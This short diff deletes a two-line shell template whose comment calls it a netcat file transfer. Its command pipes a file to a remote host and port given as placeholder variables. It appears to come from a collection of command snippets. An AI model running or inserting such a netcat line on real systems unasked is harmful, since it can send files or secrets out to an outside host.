@@ -1,2 +1,0 @@
-# description: netcat file transfer using $rhost, $rport, and $file
-nc $rhost $rport < "$file"
